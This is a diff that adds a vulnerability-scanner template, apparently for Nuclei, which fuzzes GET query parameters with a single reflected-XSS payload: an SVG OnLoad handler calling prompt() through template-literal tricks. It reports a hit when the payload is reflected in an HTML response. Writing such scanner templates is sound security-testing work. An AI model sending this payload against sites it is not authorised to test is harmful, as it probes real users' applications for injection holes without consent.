@@ -1,0 +1,40 @@
+id: fuzz-reflection-xss-svg-prompt
+
+info:
+  name: Reflection XSS via SVG OnLoad
+  author: netbaan
+  severity: medium
+  description: |
+    This template tests for reflection XSS vulnerabilities utilizing 
+    an SVG `OnLoad` mechanism combined with a `prompt()` function.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only applies to GET requests
+
+    payloads:
+      reflection:
+        - '<svg/OnLoad="\\`\\${prompt\\`\\`\\}`">'
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
